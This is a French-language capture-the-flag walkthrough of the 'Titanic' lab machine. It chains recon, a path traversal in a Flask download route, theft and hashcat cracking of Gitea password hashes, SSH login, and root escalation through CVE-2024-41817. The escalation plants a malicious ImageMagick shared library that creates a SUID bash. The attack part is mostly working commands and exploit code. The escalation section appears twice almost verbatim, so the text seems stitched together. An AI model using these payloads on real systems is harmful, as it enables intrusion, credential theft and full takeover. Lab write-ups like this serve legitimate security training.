![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

L'énumération commence par un scan **Nmap** complet pour identifier la surface d'attaque réseau. La machine expose deux services standards : **SSH** (22) et **HTTP** (80).

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.55

# Scan de services et scripts par défaut
nmap -p 22,80 -sCV 10.10.11.55
```

Le serveur Web tourne sous **Apache 2.4.52** sur **Ubuntu**. Une redirection vers `http://titanic.htb/` est détectée. J'ajoute l'entrée au fichier `/etc/hosts`.

#### Subdomain Fuzzing
Une recherche de sous-domaines via **ffuf** révèle l'existence d'un environnement de développement.

```bash
ffuf -u http://10.10.11.55 -H "Host: FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Le sous-domaine `dev.titanic.htb` est identifié. Il héberge une instance **Gitea**, un service de gestion de code source auto-hébergé.

#### Analyse de la Surface d'Attaque (Gitea)
En explorant l'instance **Gitea**, je découvre deux dépôts publics :
1.  **docker-config** : Contient des fichiers `docker-compose.yml` révélant l'arborescence du système (`/home/developer/gitea/data`) et des identifiants **MySQL** (`root:MySQLP@$$w0rd!`).
2.  **flask-app** : Contient le code source de l'application principale tournant sur `titanic.htb`.

L'analyse du fichier `app.py` met en évidence une vulnérabilité critique dans la gestion des téléchargements :

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    # [...]
    json_filepath = os.path.join(TICKETS_DIR, ticket)
    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
```

> **Schéma Mental : Exploitation de os.path.join()**
> La fonction `os.path.join(path, *paths)` en Python possède un comportement spécifique : si un argument commence par un slash `/`, il est considéré comme une racine absolue, et tous les composants précédents sont ignorés.
> - `os.path.join("tickets", "file.json")` -> `tickets/file.json` (Relatif)
> - `os.path.join("tickets", "/etc/passwd")` -> `/etc/passwd` (Absolu)
> Ce comportement permet un **Path Traversal** direct sans utiliser de séquences `../`.

#### Exploitation du File Read
Je confirme la vulnérabilité en lisant `/etc/passwd` via le paramètre `ticket`.

```bash
curl "http://titanic.htb/download?ticket=/etc/passwd"
```

L'utilisateur système `developer` est identifié. En croisant cette information avec les données du dépôt `docker-config`, je localise la base de données SQLite de **Gitea** située à l'emplacement `/home/developer/gitea/data/gitea/gitea.db`.

#### Extraction et Crack de Hash
Je récupère la base de données pour extraire les hashs de mots de passe des utilisateurs.

```bash
# Téléchargement de la DB
curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db

# Extraction des hashs (Format : passwd, salt, name)
sqlite3 gitea.db "select passwd,salt,name from user"
```

Les hashs utilisent l'algorithme **PBKDF2-HMAC-SHA256**. Je convertis les données extraites au format compatible avec **Hashcat**.

```bash
# Format Hashcat 10900: sha256:iterations:salt:hash
# Après conversion des valeurs hex en base64 :
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

L'attaque par dictionnaire sur le hash de l'utilisateur `developer` réussit rapidement.

```bash
hashcat -m 10900 gitea.hashes rockyou.txt
```

Le mot de passe identifié est **25282528**. Ce dernier est réutilisé pour obtenir un accès initial via **SSH**.

```bash
ssh developer@titanic.htb
```

L'accès est validé, je possède désormais un **Footprint** stable sur la machine cible en tant qu'utilisateur `developer`.

---

### Énumération Post-Exploitation & Escalade de Privilèges

Une fois l'accès initial établi via **SSH** avec l'utilisateur `developer`, mon objectif est d'identifier des vecteurs d'escalade de privilèges ou des processus automatisés exécutés par des utilisateurs plus privilégiés.

#### Énumération du Système

L'énumération standard des processus via `ps aux` est limitée sur cette machine. Le système de fichiers `/proc` est monté avec l'option `hidepid=invisible`, ce qui empêche de voir les processus des autres utilisateurs.

```bash
# Vérification des restrictions /proc
mount | grep "/proc "
# Résultat: proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)
```

Je me concentre donc sur le répertoire `/opt`, souvent utilisé pour des scripts personnalisés ou des configurations spécifiques.

```bash
# Analyse du contenu de /opt
ls -la /opt/
# Découverte : /opt/scripts/identify_images.sh
```

Le script `/opt/scripts/identify_images.sh` contient la logique suivante :

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

L'analyse des permissions montre que `metadata.log` appartient à **root** et est mis à jour chaque minute, confirmant l'existence d'un **Cron Job** tournant avec les privilèges les plus élevés.

> **Schéma Mental : Exploitation de Cron & Path Hijacking**
> 1. **Trigger** : Un **Cron Job** exécute un script en tant que **root**.
> 2. **Contexte** : Le script effectue un `cd` vers un répertoire où l'utilisateur `developer` a les droits d'écriture (`/opt/app/static/assets/images`).
> 3. **Vulnérabilité** : L'outil **ImageMagick** (`magick`) est vulnérable à l'injection de bibliothèques si le répertoire de travail actuel (**CWD**) est prioritaire dans le chemin de recherche des dépendances.
> 4. **Action** : Placer une **Shared Library** malveillante dans le **CWD** pour intercepter l'exécution.

#### Exploitation de la CVE-2024-41817 (ImageMagick)

La version installée d'**ImageMagick** (7.1.1-35) est vulnérable à un défaut de conception où le **Current Working Directory** est inclus dans le chemin de recherche des fichiers de configuration et des bibliothèques partagées. En créant une bibliothèque nommée `libxcb.so.1` (une dépendance liée à X11 chargée par `magick`), je peux forcer l'exécution de code arbitraire lors de l'appel de la commande `identify`.

##### 1. Préparation de la Shared Library malveillante

Je rédige un code C utilisant l'attribut `__attribute__((constructor))` pour m'assurer que le code s'exécute dès que la bibliothèque est chargée par le processus.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    // Création d'une copie SUID de bash dans /tmp
    system("cp /bin/bash /tmp/pwnbash; chmod 6777 /tmp/pwnbash");
    exit(0);
}
```

##### 2. Compilation et Déploiement

Je compile ce code directement sur la cible dans le répertoire surveillé par le script de maintenance.

```bash
# Compilation de la bibliothèque partagée
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/pwnbash; chmod 6777 /tmp/pwnbash");
    exit(0);
}
EOF
```

##### 3. Élévation de Privilèges

Après avoir attendu l'exécution du **Cron Job** (maximum 60 secondes), je vérifie la présence du binaire **SetUID** dans `/tmp`.

```bash
# Vérification du binaire SUID
ls -l /tmp/pwnbash
# Résultat attendu: -rwsrwsrwx 1 root root ... /tmp/pwnbash

# Exécution pour obtenir le shell root
/tmp/pwnbash -p
```

L'utilisation du flag `-p` est cruciale ici pour empêcher **bash** d'abandonner les privilèges effectifs fournis par le bit **SUID**. Je dispose désormais d'un accès complet au système.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial établi en tant qu'utilisateur **developer**, mon objectif est d'identifier des vecteurs d'exécution privilégiés. L'énumération du système de fichiers révèle un script intéressant situé dans `/opt/scripts`.

#### Énumération des vecteurs de Cron

Le fichier `/opt/scripts/identify_images.sh` attire immédiatement mon attention. Son contenu est succinct :

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

L'analyse des permissions et du comportement du fichier `metadata.log` indique que ce script est exécuté périodiquement par **root** via une **Cron Job**. Le script utilise l'outil **ImageMagick** (`magick`) pour traiter des images dans un répertoire où l'utilisateur **developer** possède les droits d'écriture.

#### Vulnérabilité : CVE-2024-41817 (Shared Library Hijacking)

La version d'**ImageMagick** installée est la **7.1.1-35**. Cette version est vulnérable à une **Search Path Hijacking** (CVE-2024-41817). Lorsqu'il est exécuté, **ImageMagick** inclut par défaut le répertoire de travail actuel (**Current Working Directory**) dans son chemin de recherche pour les fichiers de configuration et les **Shared Libraries**.

> **Schéma Mental :**
> 1. Le **Cron Job** change de répertoire vers `/opt/app/static/assets/images`.
> 2. Il exécute `magick identify`.
> 3. `magick` tente de charger ses dépendances, notamment `libxcb.so.1`.
> 4. À cause de la vulnérabilité, il cherche d'abord dans le répertoire courant avant les répertoires système.
> 5. En plaçant une bibliothèque malveillante nommée `libxcb.so.1` dans ce dossier, j'obtiens une exécution de code avec les privilèges de l'utilisateur lançant la commande (**root**).

#### Exploitation et Compromission Totale

Je prépare une bibliothèque partagée en C. J'utilise l'attribut `__attribute__((constructor))` pour m'assurer que mon code s'exécute dès que la bibliothèque est chargée en mémoire, avant même que la fonction principale de `magick` ne débute.

Mon payload va copier `/bin/bash` vers `/tmp/0xdf` et lui appliquer un bit **SUID**.

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
    exit(0);
}
```

Je compile ce code directement sur la cible pour générer la **Shared Library** malveillante :

```bash
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
    exit(0);
}
EOF
```

Après une minute (cycle de la **Cron Job**), je vérifie la présence de mon binaire **SUID** :

```bash
ls -l /tmp/0xdf
# Sortie : -rwsrwsrwx 1 root root 1396520 Feb 19 20:20 /tmp/0xdf

/tmp/0xdf -p
# id -> uid=1001(developer) gid=1001(developer) euid=0(root) egid=0(root)
```

Je suis désormais **root**.

---

### Analyse Post-Exploitation "Beyond Root"

L'exploitation de cette machine met en lumière plusieurs failles de configuration critiques qui, combinées, permettent une compromission totale :

1.  **Insecure Library Loading Path** : La vulnérabilité **CVE-2024-41817** est un exemple classique de **DLL/Shared Object Hijacking**. Le fait qu'un binaire complexe comme **ImageMagick** fasse confiance au contenu du répertoire courant pour charger du code exécutable est une faille de conception majeure.
2.  **Cron Job Context** : Le script de maintenance bascule (`cd`) dans un répertoire accessible en écriture par un utilisateur non privilégié avant d'exécuter des commandes. C'est une erreur de configuration fréquente. Une bonne pratique aurait été d'utiliser des chemins absolus et de s'assurer que le répertoire de travail est sécurisé (ex: `/tmp` avec des restrictions ou un répertoire appartenant à **root**).
3.  **Principle of Least Privilege** : L'utilisation d'**ImageMagick** (un outil connu pour sa large surface d'attaque et ses nombreuses CVE historiques) par l'utilisateur **root** pour une tâche simple d'extraction de métadonnées est risquée. Un utilisateur dédié avec des permissions restreintes aurait dû être utilisé pour cette tâche.
4.  **Information Leakage via Gitea** : La compromission initiale a été facilitée par l'exposition de la base de données **SQLite** de **Gitea** via une **Path Traversal**. Cela souligne l'importance de sécuriser les volumes Docker et de ne jamais stocker de secrets ou de bases de données dans des arborescences accessibles par le serveur web, même indirectement.